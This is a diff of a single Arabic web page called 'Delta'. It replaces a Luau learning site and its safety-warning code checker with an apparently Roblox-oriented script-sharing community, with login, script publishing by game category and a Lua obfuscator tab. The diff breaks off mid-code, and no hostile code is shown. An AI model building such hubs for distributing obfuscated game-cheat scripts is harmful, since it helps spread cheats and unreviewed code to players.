@@ -3,969 +3,423 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
-<meta name="theme-color" content="#0b1220">
-<title>دلتا — تعلّم Luau وبرمجة روبلوكس بالعربي</title>
+<title>دلتا - مجتمع السكريبتات</title>
 <style>
-:root{
-  --bg:#0b1220;--card:#111c33;--card2:#16233d;--text:#e8eefc;--muted:#9fb0cc;
-  --line:#1f2d4a;--acc:#4cc9f0;--acc2:#b388ff;--ok:#3ddc97;--warn:#ffb703;--bad:#ff6b6b;
-  --r:14px;
-}
-[data-theme="light"]{
-  --bg:#f5f7fb;--card:#fff;--card2:#f7f9fd;--text:#0e1626;--muted:#5b6b85;--line:#e2e8f2;
-}
+:root{--bg:#0b1220;--card:#111c33;--card2:#16233d;--text:#e8eefc;--muted:#9fb0cc;--line:#1f2d4a;--acc:#4cc9f0;--acc2:#b388ff;--ok:#3ddc97;--bad:#ff6b6b;--r:14px}
 *{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
-html,body{margin:0;padding:0}
-body{
-  font-family:system-ui,"Segoe UI",Tahoma,"Noto Naskh Arabic",Arial,sans-serif;
-  background:var(--bg);color:var(--text);line-height:1.85;font-size:16px;
-  padding-bottom:80px;
-}
-a{color:var(--acc);text-decoration:none}
-button,input,textarea,select{font-family:inherit;font-size:inherit;color:inherit}
-.wrap{max-width:1000px;margin:0 auto;padding:0 14px}
+body{font-family:system-ui,"Segoe UI",Tahoma,Arial,sans-serif;background:var(--bg);color:var(--text);line-height:1.7;margin:0;padding:20px 14px;overflow-x:hidden;}
+.wrap{max-width:800px;margin:0 auto;display:none;}
+h2{color:var(--acc);margin-top:0;text-align:center;}
+h3{font-size:16px;margin:20px 0 10px}
+.card{background:var(--card);border:1px solid var(--line);border-radius:var(--r);padding:16px;margin-bottom:16px; animation: slideUp 0.4s ease backwards;}
+label{display:block;margin-bottom:10px;font-size:13px;color:var(--muted);font-weight:bold}
+input[type=text],input[type=email],input[type=password],textarea,select{width:100%;padding:12px;border-radius:8px;border:1px solid var(--line);background:#06101e;color:var(--text);font-family:monospace;font-size:14px;margin-top:6px;transition:0.3s;}
+textarea{min-height:150px;resize:vertical;direction:ltr;text-align:left;white-space:pre;}
+.btn{padding:10px 16px;border-radius:8px;border:none;font-weight:bold;cursor:pointer;font-size:14px;margin-bottom:5px;display:inline-block;text-decoration:none;transition:0.3s;text-align:center;}
+.btn.primary{background:linear-gradient(135deg,var(--acc),var(--acc2));color:#071019}
+.btn.sm{padding:6px 10px;font-size:12px;border-radius:6px}
+.btn:active{transform:scale(.95)}
+.btn.copy-btn { background: #06101e; color: var(--acc); border: 1px solid var(--line); }
+.btn.copy-btn.copied { background: var(--ok); color: #071019; }
+.btn-nav { display: flex; gap: 10px; margin-bottom: 15px; overflow-x:auto; }
+.btn-nav button { flex: 1; padding: 10px; background: var(--card2); border: 1px solid var(--line); color: var(--text); border-radius: 8px; cursor: pointer; font-weight: bold; white-space:nowrap; }
+.btn-nav button.active { background: var(--acc); color: #071019; border-color: var(--acc); }
 
-/* Header */
-header{
-  position:sticky;top:0;z-index:50;
-  background:color-mix(in srgb,var(--bg) 88%,transparent);
-  backdrop-filter:blur(12px);-webkit-backdrop-filter:blur(12px);
-  border-bottom:1px solid var(--line);
-}
-.h-in{display:flex;align-items:center;gap:10px;height:58px}
-.logo{display:flex;align-items:center;gap:8px;font-weight:800;font-size:17px}
-.logo svg{width:30px;height:30px}
-.logo small{display:block;font-weight:500;font-size:11px;color:var(--muted);line-height:1}
-.spacer{flex:1}
-.icon-btn{
-  width:40px;height:40px;border-radius:12px;border:1px solid var(--line);
-  background:var(--card);display:grid;place-items:center;cursor:pointer;
-}
-.icon-btn:active{transform:scale(.94)}
+/* شاشات الدخول */
+#authScreen { max-width: 400px; margin: 50px auto; background: var(--card); padding: 20px; border-radius: var(--r); border: 1px solid var(--line); text-align: center; }
+#authScreen input { margin-bottom: 10px; }
+#authScreen .toggle-btn { background: none; border: none; color: var(--acc); cursor: pointer; font-size: 13px; margin-top: 10px; text-decoration: underline; }
+.error-msg { color: var(--bad); font-size: 13px; text-align: center; margin-bottom: 10px; display: none; }
 
-nav.tabs{
-  display:flex;gap:6px;overflow-x:auto;padding:8px 14px 10px;scrollbar-width:none;
-  max-width:1000px;margin:0 auto;
-}
-nav.tabs::-webkit-scrollbar{display:none}
-.tab-btn{
-  flex:none;padding:7px 14px;border-radius:999px;border:1px solid var(--line);
-  background:var(--card);cursor:pointer;font-size:13px;white-space:nowrap;
-  color:var(--muted);font-weight:700;
-}
-.tab-btn.active{background:linear-gradient(135deg,var(--acc),var(--acc2));color:#071019;border-color:transparent}
+/* السكريبتات */
+.saved-item{border:1px solid var(--line);border-radius:10px;margin-bottom:15px;background:var(--card2); overflow:hidden;}
+.saved-img { width:100%; height:140px; object-fit:cover; border-bottom:1px solid var(--line); background:#000; }
+.saved-content { padding:12px; }
+.saved-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;flex-wrap:wrap;gap:10px}
+.saved-title{font-weight:bold;font-size:16px;color:var(--acc)}
+.badge { font-size: 11px; background: rgba(179,136,255,0.2); color: var(--acc2); padding: 3px 8px; border-radius: 4px; font-weight: bold; }
+.author { font-size: 12px; color: var(--muted); margin-top: 5px; }
+.link-out{width:100%;padding:10px;border-radius:6px;border:1px solid var(--line);background:#06101e;color:var(--ok);font-family:monospace;font-size:12px;direction:ltr;text-align:left;margin-top:5px;}
+.flex-row { display: flex; gap: 8px; align-items: center; margin-top: 5px; }
+.flex-row input { margin-top: 0; flex: 1; }
 
-/* Sections */
-.section{display:none;animation:fade .25s ease}
-.section.active{display:block}
-@keyframes fade{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:none}}
+/* معاينة الصورة */
+#imagePreview { display:none; width:100%; height:120px; object-fit:cover; border-radius:8px; margin-top:10px; border:1px solid var(--line); }
 
-h1{font-size:clamp(24px,6vw,34px);line-height:1.35;margin:20px 0 8px}
-h2{font-size:clamp(19px,4.5vw,24px);margin:24px 0 10px}
-h3{font-size:17px;margin:16px 0 6px}
-p{margin:0 0 12px;color:var(--muted)}
-.lead{color:var(--muted);font-size:16px}
+/* صفحة السكريبت البيضا */
+.raw-view { background: #ffffff; color: #000000; margin: 0; padding: 20px; font-family: monospace; font-size: 14px; line-height: 1.5; white-space: pre-wrap; word-wrap: break-word; }
 
-/* Hero */
-.hero{
-  background:radial-gradient(1200px 400px at 80% -10%,rgba(76,201,240,.15),transparent),
-             radial-gradient(900px 400px at 10% 10%,rgba(179,136,255,.13),transparent);
-  border:1px solid var(--line);border-radius:22px;padding:26px 18px;margin:14px 0;
-}
-.hero .badge{
-  display:inline-flex;align-items:center;gap:6px;font-size:12px;font-weight:700;
-  padding:5px 12px;border-radius:999px;background:rgba(76,201,240,.15);
-  color:var(--acc);border:1px solid rgba(76,201,240,.3);margin-bottom:10px;
-}
-.stats{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;margin-top:16px}
-.stat{background:var(--card);border:1px solid var(--line);border-radius:12px;padding:10px;text-align:center}
-.stat b{display:block;font-size:20px;color:var(--acc)}
-.stat span{font-size:12px;color:var(--muted)}
-
-/* Cards */
-.card{background:var(--card);border:1px solid var(--line);border-radius:var(--r);padding:16px;margin-bottom:12px}
-.grid{display:grid;gap:10px}
-@media(min-width:680px){.grid.two{grid-template-columns:1fr 1fr}}
-
-/* Buttons */
-.btn{
-  display:inline-flex;align-items:center;justify-content:center;gap:6px;
-  padding:10px 18px;border-radius:10px;border:1px solid var(--line);
-  background:var(--card2);color:var(--text);cursor:pointer;font-weight:700;
-  font-size:14px;transition:.15s;
-}
-.btn:active{transform:scale(.97)}
-.btn.primary{background:linear-gradient(135deg,var(--acc),var(--acc2));color:#071019;border-color:transparent}
-.btn.ghost{background:transparent}
-.btn.sm{padding:7px 12px;font-size:12px;border-radius:8px}
-.btn:disabled{opacity:.5;cursor:not-allowed}
-
-/* Lessons */
-.lesson{border:1px solid var(--line);border-radius:12px;background:var(--card);margin-bottom:10px;overflow:hidden}
-.lesson-h{
-  width:100%;display:flex;align-items:center;gap:10px;padding:13px 14px;
-  background:none;border:none;cursor:pointer;text-align:right;font-weight:700;color:var(--text);
-}
-.lesson-h .num{
-  flex:none;width:32px;height:32px;border-radius:9px;display:grid;place-items:center;
-  background:var(--card2);border:1px solid var(--line);font-size:12px;color:var(--acc);
-}
-.lesson.done .num{background:rgba(61,220,151,.15);color:var(--ok);border-color:rgba(61,220,151,.35)}
-.lesson-h .t{flex:1;font-size:15px}
-.lesson-h .chev{color:var(--muted);transition:.25s;font-size:18px}
-.lesson.open .chev{transform:rotate(-90deg)}
-.lesson-b{display:none;padding:0 16px 16px;border-top:1px solid var(--line);padding-top:12px}
-.lesson.open .lesson-b{display:block}
-.lesson-b ul{padding-right:18px;color:var(--muted);font-size:14px}
-.lesson-b li{margin-bottom:4px}
-
-/* Code block */
-.code-wrap{position:relative;margin:10px 0}
-.code-head{
-  display:flex;align-items:center;justify-content:space-between;
-  background:var(--card2);border:1px solid var(--line);border-bottom:none;
-  padding:6px 10px;border-radius:10px 10px 0 0;font-size:11px;color:var(--muted);
-}
-pre{
-  margin:0;background:#06101e;border:1px solid var(--line);border-radius:0 0 10px 10px;
-  padding:12px;overflow-x:auto;font-family:'Courier New',monospace;font-size:12.5px;
-  line-height:1.6;direction:ltr;text-align:left;color:#cdd6f4;
-}
-[data-theme="light"] pre{background:#0e1626;color:#e8eefc}
-.hl-keyword{color:#ff79c6;font-weight:700}
-.hl-string{color:#50fa7b}
-.hl-comment{color:#6272a4;font-style:italic}
-.hl-number{color:#f1fa8c}
-
-/* Checker */
-.checker-box{margin-top:10px}
-.checker-box textarea{
-  width:100%;min-height:220px;padding:12px;border-radius:10px;
-  border:1px solid var(--line);background:#06101e;color:#cdd6f4;
-  font-family:'Courier New',monospace;font-size:13px;line-height:1.55;
-  direction:ltr;text-align:left;resize:vertical;
-}
-.checker-box textarea:focus{outline:2px solid var(--acc);outline-offset:1px}
-
-.samples{display:flex;gap:6px;flex-wrap:wrap;margin:10px 0}
-.samples .btn{font-size:12px;padding:6px 10px}
-
-.result-card{
-  border-radius:12px;padding:12px 14px;margin-top:12px;
-  border:1px solid var(--line);background:var(--card);
-}
-.result-card.ok{border-color:rgba(61,220,151,.4);background:rgba(61,220,151,.06)}
-.result-card.warn{border-color:rgba(255,183,3,.4);background:rgba(255,183,3,.06)}
-.result-card.err{border-color:rgba(255,107,107,.4);background:rgba(255,107,107,.06)}
-.result-card h4{margin:0 0 8px;font-size:15px}
-.result-card ul{margin:0;padding-right:18px;font-size:13.5px}
-.result-card li{margin-bottom:5px;color:var(--text);line-height:1.7}
-.result-card li b{color:var(--acc)}
-
-/* Bottom nav */
-.bottom-nav{
-  position:fixed;bottom:0;left:0;right:0;z-index:60;
-  background:color-mix(in srgb,var(--bg) 92%,transparent);
-  backdrop-filter:blur(14px);-webkit-backdrop-filter:blur(14px);
-  border-top:1px solid var(--line);
-  display:flex;padding-bottom:env(safe-area-inset-bottom);
-}
-.bn-item{
-  flex:1;display:flex;flex-direction:column;align-items:center;gap:2px;
-  padding:8px 4px;background:none;border:none;cursor:pointer;color:var(--muted);
-  font-size:11px;font-weight:700;
-}
-.bn-item svg{width:21px;height:21px}
-.bn-item.active{color:var(--acc)}
-
-footer{text-align:center;padding:20px 0;color:var(--muted);font-size:12px;border-top:1px solid var(--line);margin-top:24px}
+@keyframes slideUp { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+.hidden { display: none !important; }
 </style>
 </head>
 <body>
 
-<header>
-  <div class="wrap h-in">
-    <div class="logo">
-      <svg viewBox="0 0 32 32" fill="none">
-        <path d="M16 3 L29 27 H3 Z" stroke="url(#g1)" stroke-width="2.5" stroke-linejoin="round"/>
-        <path d="M16 11 L23 24 H9 Z" fill="url(#g1)" opacity=".35"/>
-        <defs><linearGradient id="g1" x1="0" y1="0" x2="32" y2="32">
-          <stop stop-color="#4cc9f0"/><stop offset="1" stop-color="#b388ff"/>
-        </linearGradient></defs>
-      </svg>
-      <div>دلتا<small>تعلّم Luau وRoblox بالعربي</small></div>
+<!-- شاشة تسجيل الدخول -->
+<div id="authScreen" class="hidden">
+    <h2>مجتمع دلتا</h2>
+    <div id="errorMsg" class="error-msg"></div>
+    
+    <div id="loginForm">
+        <input type="text" id="loginUser" placeholder="اسم المستخدم">
+        <input type="password" id="loginPass" placeholder="كلمة المرور">
+        <button class="btn primary" style="width:100%" onclick="doLogin()">تسجيل الدخول</button>
+        <button class="toggle-btn" onclick="toggleAuth('register')">معندكش حساب؟ سجل من هنا</button>
     </div>
-    <div class="spacer"></div>
-    <button class="icon-btn" id="themeBtn" aria-label="تبديل الوضع">🌙</button>
+
+    <div id="registerForm" class="hidden">
+        <input type="text" id="regUser" placeholder="اسم المستخدم (لا يتغير)">
+        <input type="password" id="regPass" placeholder="كلمة المرور (6 حروف على الأقل)">
+        <button class="btn primary" style="width:100%" onclick="doRegister()">إنشاء حساب</button>
+        <button class="toggle-btn" onclick="toggleAuth('login')">عندك حساب؟ سجل دخول</button>
+    </div>
+</div>
+
+<!-- الموقع الأساسي -->
+<div class="wrap" id="mainUI">
+  <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:15px;">
+      <h2 style="margin:0;">دلتا</h2>
+      <div>
+          <span id="userDisplay" style="font-weight:bold; color:var(--acc2);"></span>
+          <button class="btn sm" onclick="doLogout()" style="background:transparent;color:var(--bad);border:1px solid var(--bad);">خروج</button>
+      </div>
   </div>
-  <nav class="tabs" id="tabs">
-    <button class="tab-btn active" data-tab="home">الرئيسية</button>
-    <button class="tab-btn" data-tab="lessons">الدروس</button>
-    <button class="tab-btn" data-tab="checker">فاحص الأكواد</button>
-    <button class="tab-btn" data-tab="about">عن دلتا</button>
-  </nav>
-</header>
 
-<main class="wrap">
+  <div class="btn-nav">
+      <button id="navAdd" class="active" onclick="switchTab('add')">نشر سكريبت</button>
+      <button id="navObf" onclick="switchTab('obf')">التمويه</button>
+      <button id="navMy" onclick="switchTab('my')">سكريبتاتي</button>
+      <button id="navComm" onclick="switchTab('comm')">المجتمع</button>
+  </div>
 
-  <!-- الرئيسية -->
-  <section class="section active" id="home">
-    <div class="hero">
-      <span class="badge">● مسار عربي كامل لـ Roblox</span>
-      <h1>اتعلم Luau بالعربي — من الصفر للاحتراف</h1>
-      <p class="lead">دروس مرتبة، كود أمثلة جاهز تنسخه، وفاحص سكريبتات يمسك غلطاتك قبل ما تشغّل.</p>
-      <a class="btn primary" data-goto="lessons">ابدأ التعلم →</a>
-      <a class="btn ghost" data-goto="checker">افحص كودك</a>
-      <div class="stats">
-        <div class="stat"><b>12</b><span>درس</span></div>
-        <div class="stat"><b>+50</b><span>مثال كود</span></div>
-        <div class="stat"><b>25+</b><span>فحص أمان</span></div>
-      </div>
-    </div>
-    <div class="grid two">
+  <!-- إضافة سكريبت -->
+  <div id="tabAdd">
       <div class="card">
-        <h3>📚 دروس بعمق</h3>
-        <p>مش مجرد تعريفات — كل درس فيه كود حقيقي بيتنفذ في روبلوكس، مع تفسير كل سطر.</p>
-        <button class="btn sm" data-goto="lessons">افتح الدروس</button>
+        <label>اسم السكريبت
+          <input type="text" id="scriptName" placeholder="مثلاً: سكريبت طيران">
+        </label>
+        <label>التصنيف
+          <select id="scriptCategory">
+              <option value="عام">عام</option>
+              <option value="MM2">MM2 (ميردر ميستري)</option>
+              <option value="ماب السرقة">ماب السرقة</option>
+              <option value="تايم بومب">تايم بومب</option>
+          </select>
+        </label>
+        <label>صورة السكريبت (من معرض الصور)
+          <input type="file" id="scriptImage" accept="image/*" onchange="handleImageUpload(event)" style="padding:10px; background:var(--card2); border:1px dashed var(--acc);">
+          <input type="hidden" id="scriptImageData">
+        </label>
+        <img id="imagePreview" src="" alt="معاينة الصورة">
+        
+        <label style="margin-top:15px;">كود السكريبت (Lua)
+          <textarea id="scriptCode" placeholder="-- الزق الكود هنا" spellcheck="false"></textarea>
+        </label>
+        <button class="btn primary" id="saveBtn" onclick="saveScript()" style="width:100%; margin-top:10px;">🚀 نشر السكريبت</button>
       </div>
+  </div>
+
+  <!-- أداة التمويه المستقلة -->
+  <div id="tabObf" class="hidden">
       <div class="card">
-        <h3>🔍 فاحص الأكواد</h3>
-        <p>الزق أي سكريبت لوا، وهيطلعلك أخطاء البلوكات والأقواس + تحذيرات أمان (loadstring، _G، حلقات لا نهائية).</p>
-        <button class="btn sm" data-goto="checker">افحص كود</button>
+          <h3>تمويه السكريبت (Obfuscator)</h3>
+          <p style="font-size:12px;color:var(--muted);margin-bottom:15px;">حط الكود العادي فوق، ودوس تمويه عشان يطلعلك الكود المموه تحت. الأداة دي سريعة جداً وبتستحمل أي حجم نص.</p>
+          
+          <label>الكود العادي (فوق)</label>
+          <textarea id="plainCode" placeholder="-- اكتب الكود هنا --" spellcheck="false"></textarea>
+          
+          <button class="btn primary" style="width:100%; margin-top:10px; font-size:16px;" onclick="obfuscateCode()">🔐 تمويه السكريبت</button>
+          
+          <label style="margin-top:20px;">الكود المموه (تحت)</label>
+          <textarea id="encryptedCode" placeholder="-- الكود المموه هيظهر هنا --" readonly spellcheck="false"></textarea>
+          
+          <button class="btn copy-btn" style="width:100%; margin-top:5px;" onclick="copyText(document.getElementById('encryptedCode').value, this)">📋 نسخ الكود المموه</button>
       </div>
-    </div>
-  </section>
+  </div>
 
-  <!-- الدروس -->
-  <section class="section" id="lessons">
-    <h2>الدروس</h2>
-    <p>اضغط على أي درس يفتح، تقرا الشرح والكود، وتعلّم إنك خلصته.</p>
-    <div id="lessonList"></div>
-  </section>
+  <!-- سكريبتاتي -->
+  <div id="tabMy" class="hidden">
+      <div id="myList"><p style="color:var(--muted);text-align:center;">جاري التحميل...</p></div>
+  </div>
 
-  <!-- فاحص الأكواد -->
-  <section class="section" id="checker">
-    <h2>فاحص الأكواد</h2>
-    <p>الزق كود Lua/Luau تحت، واضغط «افحص». الفحص بيتحقق من: توازن if/end و function/end و for/do و while/do و repeat/until، توازن الأقواس، دوال خطيرة، حلقات مش هتوقف.</p>
-    <div class="card checker-box">
-      <div class="samples" id="samples"></div>
-      <textarea id="codeInput" placeholder="-- الزق كود Lua هنا&#10;local x = 5&#10;if x > 3 then&#10;    print(&quot;كبير&quot;)&#10;end" spellcheck="false"></textarea>
-      <div style="display:flex;gap:8px;margin-top:10px;flex-wrap:wrap">
-        <button class="btn primary" id="checkBtn">🔍 افحص الكود</button>
-        <button class="btn ghost" id="clearBtn">مسح</button>
+  <!-- المجتمع -->
+  <div id="tabComm" class="hidden">
+      <div class="card" style="padding:10px;">
+          <input type="text" id="searchInput" placeholder="ابحث باسم السكريبت..." oninput="filterCommunity()">
       </div>
-      <div id="checkResult"></div>
-    </div>
-  </section>
+      <div id="communityList"><p style="color:var(--muted);text-align:center;">جاري التحميل...</p></div>
+  </div>
+</div>
 
-  <!-- عن دلتا -->
-  <section class="section" id="about">
-    <h2>عن دلتا</h2>
-    <div class="card">
-      <p><b>دلتا</b> منصة عربية تعليمية، هدفها إن أي حد عربي يبدأ برمجة روبلوكس من غير ما يتحطم قدام الإنجليزية.</p>
-      <p>الكود نفسه بـ Luau (إنجليزي الكلمات المفتاحية)، لكن <b>الشرح كله بالعربي</b>، والأمثلة معمولة مخصوص عشان تفهم مش بس تنسخ.</p>
-      <h3>المبادئ</h3>
-      <ul style="color:var(--muted);padding-right:18px">
-        <li><b>عمق قبل شكل:</b> الشرح يوضح «ليه» مش بس «إزاي».</li>
-        <li><b>كود حقيقي:</b> كل مثال يشتغل فعلاً في Roblox Studio.</li>
-        <li><b>أمان:</b> تنبيهات واضحة عن loadstring و_G وgetfenv.</li>
-      </ul>
-    </div>
-  </section>
+<!-- أكواد Firebase -->
+<script type="module">
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
+  import { getAuth, createUserWithEmailAndPassword, signInWithEmailAndPassword, signOut, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js";
+  import { getFirestore, collection, addDoc, query, where, getDocs, onSnapshot, deleteDoc, doc, orderBy, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
 
-</main>
-
-<footer class="wrap">دلتا © <span id="year"></span> — صُنع لكتّاب Lua العرب</footer>
-
-<nav class="bottom-nav">
-  <button class="bn-item active" data-tab="home">
-    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 11 12 3l9 8v9a1 1 0 0 1-1 1h-5v-6H9v6H4a1 1 0 0 1-1-1z"/></svg>
-    <span>الرئيسية</span>
-  </button>
-  <button class="bn-item" data-tab="lessons">
-    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 4h11a3 3 0 0 1 3 3v13H7a3 3 0 0 1-3-3z"/><path d="M4 17a3 3 0 0 1 3-3h11"/></svg>
-    <span>الدروس</span>
-  </button>
-  <button class="bn-item" data-tab="checker">
-    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="7"/><path d="m20 20-3.5-3.5"/></svg>
-    <span>الفاحص</span>
-  </button>
-  <button class="bn-item" data-tab="about">
-    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="9"/><path d="M12 11v6M12 7.5v.01"/></svg>
-    <span>عن دلتا</span>
-  </button>
-</nav>
-
-<script>
-/* ===== Helpers ===== */
-const $ = (s, r=document) => r.querySelector(s);
-const $$ = (s, r=document) => Array.from(r.querySelectorAll(s));
-const store = {
-  get(k, d){ try{ return JSON.parse(localStorage.getItem('delta.'+k)) ?? d; }catch(e){ return d; } },
-  set(k, v){ try{ localStorage.setItem('delta.'+k, JSON.stringify(v)); }catch(e){} }
-};
-const esc = s => String(s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
-
-/* ===== Theme ===== */
-function applyTheme(t){
-  document.documentElement.dataset.theme = t;
-  $('#themeBtn').textContent = t === 'light' ? '☀️' : '🌙';
-  store.set('theme', t);
-}
-applyTheme(store.get('theme', 'dark'));
-$('#themeBtn').addEventListener('click', () => {
-  applyTheme(document.documentElement.dataset.theme === 'light' ? 'dark' : 'light');
-});
-
-/* ===== Nav ===== */
-function goTab(name){
-  $$('.section').forEach(s => s.classList.toggle('active', s.id === name));
-  $$('.tab-btn').forEach(b => b.classList.toggle('active', b.dataset.tab === name));
-  $$('.bn-item').forEach(b => b.classList.toggle('active', b.dataset.tab === name));
-  window.scrollTo({top:0, behavior:'smooth'});
-}
-document.addEventListener('click', e => {
-  const t = e.target.closest('[data-tab]');
-  if (t) goTab(t.dataset.tab);
-  const g = e.target.closest('[data-goto]');
-  if (g) goTab(g.dataset.goto);
-});
-
-/* ===== Lua Syntax Highlighter (tokenizer) ===== */
-const LUA_KEYWORDS = new Set(['if','then','elseif','else','end','for','while','do','repeat','until','function','return','local','break','and','or','not','in','nil','true','false']);
-
-function tokenizeLua(code){
-  const tokens = [];
-  let i = 0;
-  const n = code.length;
-  while (i < n){
-    // Comment
-    if (code[i] === '-' && code[i+1] === '-'){
-      const start = i;
-      if (code[i+2] === '[' && code[i+3] === '['){
-        let j = code.indexOf(']]', i+4);
-        if (j === -1) j = n;
-        tokens.push({type:'comment', text: code.slice(start, j+2)});
-        i = j+2;
-      } else {
-        while (i < n && code[i] !== '\n') i++;
-        tokens.push({type:'comment', text: code.slice(start, i)});
-      }
-      continue;
-    }
-    // String
-    if (code[i] === '"' || code[i] === "'"){
-      const q = code[i]; const start = i; i++;
-      while (i < n && code[i] !== q){ if (code[i] === '\\') i++; i++; }
-      i++;
-      tokens.push({type:'string', text: code.slice(start, i)});
-      continue;
-    }
-    // Long string [[...]]
-    if (code[i] === '[' && code[i+1] === '['){
-      const start = i;
-      let j = code.indexOf(']]', i+2); if (j === -1) j = n;
-      tokens.push({type:'string', text: code.slice(start, j+2)});
-      i = j+2;
-      continue;
-    }
-    // Number
-    if (/[0-9]/.test(code[i]) || (code[i] === '.' && /[0-9]/.test(code[i+1]||''))){
-      const start = i;
-      while (i < n && /[0-9.xXa-fA-F]/.test(code[i])) i++;
-      tokens.push({type:'number', text: code.slice(start, i)});
-      continue;
-    }
-    // Identifier (supports Arabic/UTF8)
-    if (/[a-zA-Z_\u0080-\uFFFF]/.test(code[i])){
-      const start = i;
-      while (i < n && /[a-zA-Z0-9_\u0080-\uFFFF]/.test(code[i])) i++;
-      const w = code.slice(start, i);
-      tokens.push({type: LUA_KEYWORDS.has(w) ? 'keyword' : 'ident', text: w});
-      continue;
-    }
-    tokens.push({type:'other', text: code[i]});
-    i++;
-  }
-  return tokens;
-}
-
-function highlightLua(code){
-  return tokenizeLua(code).map(t => {
-    const e = esc(t.text);
-    switch(t.type){
-      case 'comment': return `<span class="hl-comment">${e}</span>`;
-      case 'string':  return `<span class="hl-string">${e}</span>`;
-      case 'keyword': return `<span class="hl-keyword">${e}</span>`;
-      case 'number':  return `<span class="hl-number">${e}</span>`;
-      default: return e;
-    }
-  }).join('');
-}
-
-/* ===== Strip strings/comments (preserves positions) ===== */
-function stripLua(code){
-  const out = code.split('');
-  let i = 0, n = code.length;
-  while (i < n){
-    const c = code[i];
-    if (c === '-' && code[i+1] === '-'){
-      if (code[i+2] === '[' && code[i+3] === '['){
-        let j = code.indexOf(']]', i+4); if (j === -1) j = n;
-        for (let k=i; k<j+2 && k<n; k++) if (code[k] !== '\n') out[k] = ' ';
-        i = j+2; continue;
-      }
-      while (i < n && code[i] !== '\n'){ out[i] = ' '; i++; }
-      continue;
-    }
-    if (c === '[' && code[i+1] === '['){
-      let j = code.indexOf(']]', i+2); if (j === -1) j = n;
-      for (let k=i; k<j+2 && k<n; k++) if (code[k] !== '\n') out[k] = ' ';
-      i = j+2; continue;
-    }
-    if (c === '"' || c === "'"){
-      const q = c;
-      out[i] = ' '; i++;
-      while (i < n && code[i] !== q){
-        if (code[i] === '\\'){ out[i] = ' '; i++; }
-        if (i < n){ if (code[i] !== '\n') out[i] = ' '; i++; }
-      }
-      if (i < n) out[i] = ' ';
-      i++; continue;
-    }
-    i++;
-  }
-  return out.join('');
-}
-
-/* ===== Line number helper ===== */
-function makeLineOf(text){
-  const starts = [0];
-  for (let i = 0; i < text.length; i++) if (text[i] === '\n') starts.push(i+1);
-  return p => {
-    let lo = 0, hi = starts.length - 1;
-    while (lo < hi){
-      const mid = (lo + hi + 1) >> 1;
-      if (starts[mid] <= p) lo = mid; else hi = mid - 1;
-    }
-    return lo + 1;
+  // ⚠️⚠️ ضع المفتاح بتاعك هنا مكان الكلام ده ⚠️⚠️
+  const firebaseConfig = {
+    apiKey: "YOUR_API_KEY",
+    authDomain: "YOUR_PROJECT.firebaseapp.com",
+    projectId: "YOUR_PROJECT_ID",
+    storageBucket: "YOUR_PROJECT.appspot.com",
+    messagingSenderId: "YOUR_SENDER_ID",
+    appId: "YOUR_APP_ID"
   };
-}
 
-/* ===== Lua Checker ===== */
-function checkLua(rawCode){
-  const errors = [], warnings = [], infos = [];
-  if (!rawCode.trim()){
-    errors.push('مفيش كود — الزق سكريبت الأول.');
-    return { errors, warnings, infos };
+  const app = initializeApp(firebaseConfig);
+  const auth = getAuth(app);
+  const db = getFirestore(app);
+
+  let currentUser = null;
+  let currentUsername = "";
+  let allScriptsCache = [];
+
+  // دوال مساعدة
+  window.encodeCode = (str) => btoa(unescape(encodeURIComponent(str)));
+  window.decodeCode = (str) => decodeURIComponent(escape(atob(str)));
+  
+  window.showError = (msg) => {
+      const err = document.getElementById('errorMsg');
+      err.textContent = msg; err.style.display = 'block';
+      setTimeout(() => { err.style.display = 'none'; }, 4000);
+  };
+
+  window.toggleAuth = (type) => {
+      document.getElementById('loginForm').classList.toggle('hidden', type !== 'login');
+      document.getElementById('registerForm').classList.toggle('hidden', type !== 'register');
+      document.getElementById('errorMsg').style.display = 'none';
+  };
+
+  // ====== معالجة الصورة وضغطها ======
+  window.handleImageUpload = (event) => {
+      const file = event.target.files[0];
+      if (!file) return;
+      
+      const reader = new FileReader();
+      reader.onload = (e) => {
+          const img = new Image();
+          img.onload = () => {
+              const canvas = document.createElement('canvas');
+              const MAX_WIDTH = 500; // عرض مناسب
+              const scaleSize = MAX_WIDTH / img.width;
+              canvas.width = MAX_WIDTH;
+              canvas.height = img.height * scaleSize;
+              
+              const ctx = canvas.getContext('2d');
+              ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
+              
+              // ضغط الصورة لتكون صغيرة الحجم (JPEG 60%)
+              const dataUrl = canvas.toDataURL('image/jpeg', 0.6);
+              document.getElementById('scriptImageData').value = dataUrl;
+              
+              const preview = document.getElementById('imagePreview');
+              preview.src = dataUrl;
+              preview.style.display = 'block';
+          };
+          img.src = e.target.result;
+      };
+      reader.readAsDataURL(file);
+  };
+
+  // صور افتراضية حسب التصنيف (لو مرفعش صورة)
+  function getDefaultImage(category) {
+      const images = {
+          "MM2": "https://images.unsplash.com/photo-1605810230434-7631ac76ec81?auto=format&fit=crop&w=500&q=80",
+          "ماب السرقة": "https://images.unsplash.com/photo-1552820728-8b83bb6b773f?auto=format&fit=crop&w=500&q=80",
+          "تايم بومب": "https://images.unsplash.com/photo-1511512578047-dfb367046420?auto=format&fit=crop&w=500&q=80",
+          "عام": "https://images.unsplash.com/photo-1614680376593-902f74cf0d41?auto=format&fit=crop&w=500&q=80"
+      };
+      return images[category] || images["عام"];
   }
 
-  const clean = stripLua(rawCode);
-  const lineOf = makeLineOf(clean);
-  const tokens = [];
